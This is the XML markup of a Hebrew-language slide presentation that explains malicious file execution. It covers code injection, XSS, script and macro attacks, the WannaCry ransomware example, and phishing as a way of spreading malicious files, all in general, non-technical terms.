        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4575313" y="2135726"/>
            <a:ext cx="2876951" cy="1162212"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="תמונה 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{732EFA3C-A1BC-402B-BF95-946A22755BEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4575312" y="3858236"/>
            <a:ext cx="2876951" cy="1162212"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="תמונה 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7F12909-5EFB-47FF-A314-74FA7869B597}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="52332" y="5432629"/>
            <a:ext cx="7821116" cy="1095528"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="70372779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E448B4-A985-4301-A550-888068A069A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4651512" y="642594"/>
            <a:ext cx="6473687" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - כלי להתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="מציין מיקום תוכן 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C844ED9-F4A8-4A8B-8DF6-C83E79D527A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="218661" y="208722"/>
            <a:ext cx="4432851" cy="6410739"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="תמונה 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2560E2E8-E1C3-4DBD-9920-30B76613F830}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4651512" y="3647246"/>
            <a:ext cx="5934903" cy="2972215"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="421089595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20A52DDC-2F15-490F-B9E4-4D38031B1291}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6000" dirty="0"/>
              <a:t>הפעלה זדונית של קבצים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6000" dirty="0"/>
              <a:t>Malicious File Execution</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="6000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="366122151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45EB02-55E0-4296-BCBE-C2972B208473}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3955774" y="642594"/>
            <a:ext cx="7169426" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מבוא להפעלה זדונית של קבצים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDED2C71-C9E0-47E7-931C-657C05EA3A5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Malicious File Execution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפעלה זדונית של קבצים: היא אחת הטכניקות הנפוצות והאפקטיביות ביותר לתקיפת מערכות מחשב. בשיטה זו, תוקף מנסה לגרום לקורבן להפעיל קובץ שמכיל קוד זדוני, אשר עלול לבצע פעולות מזיקות במערכת המחשב של הקורבן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך זה עובד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בקצרה, הקובץ הזדוני יכול להיות מצורף למייל, להורדה מאתר אינטרנט, או אפילו כחלק מקובץ תמים שנמצא ברשתות שיתוף קבצים. לאחר שהקורבן מוריד או מפעיל את הקובץ, הקוד הזדוני מופעל ויכול לגרום לנזק כמו:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גניבת מידע רגיש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כגון סיסמאות, מספרי אשראי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>וכו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>'.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקנה של תוכנות ריגול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שממשיכות לפעול ברקע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השגת גישה מרחוק</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לתוקף למערכת הקורבן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הצפנה של קבצים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לצורך סחיטה (כמו במתקפת כופר – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259332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2BE735D-CC8E-46C7-9EDD-30F7D942B4B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="642594"/>
            <a:ext cx="8382000" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – הפעלה זדונית של קבצים </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55749FDA-0A4D-4C4D-8C26-50E6D6618988}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה מסיפור </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>אמיתי</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב-2017, תוכנת כופר בשם</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>WannaCry</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התפשטה ברחבי העולם וגרמה לנזק עצום. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הכל</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התחיל מקובץ זדוני שהגיע במייל או הוצג באתר פופולרי. כשהמשתמש הפעיל את הקובץ, הקוד הזדוני השתמש בפגיעות ידועה במערכות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והתחיל להצפין את כל הקבצים במחשב הקורבן. לאחר מכן, המשתמש נדרש לשלם כופר כדי לשחרר את הקבצים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="913789294"/>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C24C9B6-18BF-4E09-8017-8C1ED5846935}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2872408" y="642594"/>
            <a:ext cx="8252791" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malicious File Execution</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41C15E46-3456-4E8E-BB20-71A2B3C4AD01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>1. הזרקת קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Code Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה זה?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הזרקת קוד היא סוג של התקפה שבה התוקף מכניס קוד זדוני לקובץ תמים או אפילו לתוך יישום אינטרנט, כך שבזמן הרצת הקובץ או היישום, הקוד הזדוני מתבצע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> דמיין תוקף שמצליח להזריק קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לקובץ המנוהל על ידי מסד נתונים. כשהקובץ מופעל, הקוד הזדוני יכול לבצע פעולות לא חוקיות במסד הנתונים, כמו גניבת נתונים או מחיקתם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>2. הרצת סקריפטים באתרי אינטרנט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Cross-Site Scripting – XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה זה?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא התקפה שבה התוקף מזריק סקריפט בדרך כלל בשפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לתוך דף אינטרנט שנראה תמים. כאשר הקורבן גולש לאותו דף, הסקריפט הזדוני מתבצע בדפדפן שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוקף משאיר תגובה באתר עם קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני. כאשר משתמש אחר גולש לאותו דף ומפעיל את הסקריפט, המידע האישי שלו עלול להיגנב או המחשב שלו עלול להידבק.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="323592434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905A2CB-E7EA-441C-93A6-3F18810E61FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1878496" y="642594"/>
            <a:ext cx="9246704" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - סוגי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malicious File Execution</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{477F48D1-4DFD-4B49-9456-C680E422C58B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>3. הרצת קבצי סקריפטים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Script Execution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה זה?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקפה שבה התוקף גורם לקורבן להפעיל סקריפט זדוני, כמו סקריפט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ,PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שיכול לבצע מגוון פעולות במערכת הקורבן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> דמיין תוקף ששולח קובץ ".</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמכיל פקודות להריץ ברקע תהליכים זדוניים, כמו הורדת קבצים נוספים או פתיחת דלת אחורית למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>4. קבצי מאקרו זדוניים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה זה?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקפה שבה התוקף משתמש במאקרו, שהוא בעצם קובץ קטן שמכיל פקודות להפעלה אוטומטית (בדרך כלל בקובצי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Office </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כמו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Word </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ו-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Excel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Excel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שנראה תמים עשוי להכיל מאקרו שמוריד ומפעיל תוכנה זדונית ברגע שהמשתמש מפעיל את המאקרו.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="299158637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B42C7D6-E9E8-4290-8F71-DF63935046D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2276061" y="642594"/>
            <a:ext cx="8849138" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שיטות נפוצות להפצה של קבצים זדוניים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D36AC04-D9C7-4F59-BDC1-CBEFE2BE8C50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים משתמשים במיילים מזויפים שנראים כאילו הגיעו ממקור אמין כדי לשכנע את הקורבן להוריד ולהפעיל קובץ זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: מייל שמדמה הודעה מהבנק עם צרופה שמכילה "דוח חשבון", ובפועל מדובר בקובץ זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>2. הורדות ממקומות לא מאובטחים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הורדת קבצים מאתרים לא מאובטחים או מפוקפקים, שעלולים להכיל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>נוזקות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: הורדה של תוכנה חינמית מאתר לא מוכר, שכוללת קובץ התקנה עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>נוזקה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>3. הנדסה חברתית </a:t>
            </a:r>
            <a:r>
